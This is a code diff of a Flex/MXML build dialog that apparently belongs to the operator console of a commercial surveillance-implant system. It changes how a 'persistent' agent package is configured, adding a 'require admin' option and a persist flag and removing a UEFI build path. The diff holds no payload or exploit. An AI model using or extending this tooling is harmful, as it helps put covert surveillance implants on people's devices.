@@ -2,10 +2,10 @@
 <s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
          xmlns:s="library://ns.adobe.com/flex/spark" 
          xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%" xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">
+    
   <fx:Script>
     <![CDATA[
       import it.ht.rcs.console.monitor.controller.LicenseManager;
-      import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
       import it.ht.rcs.console.operations.view.configuration.ConfigurationView;
       import it.ht.rcs.console.task.controller.DownloadManager;
       import it.ht.rcs.console.utils.AlertPopUp;
@@ -17,41 +17,12 @@
       import mx.rpc.events.FaultEvent;
       import mx.rpc.events.ResultEvent;
       
-      private var fileReference:FileReference;
+      [Bindable]
+      public var configView:ConfigurationView;
       
       [Bindable]
       private var _platform:String;
       
-      [Bindable]
-      public var configView:ConfigurationView;
-      
-     
-      private var uploadPopup:UploadPopup;
-      private function create():void
-      {
-        
-        var params:Object = {platform: 'uefi', generate: {platforms: [parentDocument.platform], 
-            binary: {demo: createBtn.demo.selected}, 
-            melt: {scout: true} } 
-        };
-        
-        params['factory'] = {_id: parentDocument.factory._id};
-        
-        var filename:String = parentDocument.factory.name + "_" + parentDocument.platform + '_persistent.zip'
-        
-        DownloadManager.instance.createTask("build", filename, params, onSuccess, onFailure);        
-      }
-            
-      private function onSuccess(e:ResultEvent):void
-      {
-        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
-      }
-      
-      private function onFailure(e:FaultEvent):void
-      {
-        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
-      }
-
       public function set platform(platform:*):void
       {
         if (platform == null)
@@ -61,8 +32,42 @@
         
         createBtn.platforms = [platform];
       }
+        
+      protected function create():void
+      {
+        var params:Object;
+        
+        params = {factory: {_id: parentDocument.factory._id}, 
+                  platform: parentDocument.platform, 
+                  binary: {demo: createBtn.demo.selected, admin: admin.selected, persist: true}, 
+                  melt: {}, 
+                  'package': {} };
+        
+        var filename:String = parentDocument.factory.name + "_" + parentDocument.platform + '_persistent.zip'
+        
+        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
+        DownloadManager.instance.createTask("build", filename, params, onSuccess, onFailure);
+      }
+      
+      private function onSuccess(e:ResultEvent):void
+      {
+        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
+      }
+      
+      private function onFailure(e:FaultEvent):void
+      {
+        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
+      }
+      
     ]]>
   </fx:Script>
+ 
+  <s:VGroup left="10" top="10">
+    <s:CheckBox left="10" id="admin" label="{R.get('REQUIRE_ADMIN')}" fontWeight="bold" selected="false"/>
+    <s:TextArea left="25" width="280" height="55" borderVisible="false"
+                contentBackgroundAlpha="0.0" editable="false"
+                text="{R.get('REQUIRE_ADMIN_DESC')}"/>   
+  </s:VGroup>
   
   
   <build:CreateWithDemoButton id="createBtn" left="10" bottom="0" right="10" create="{create}" configView="{configView}"/>
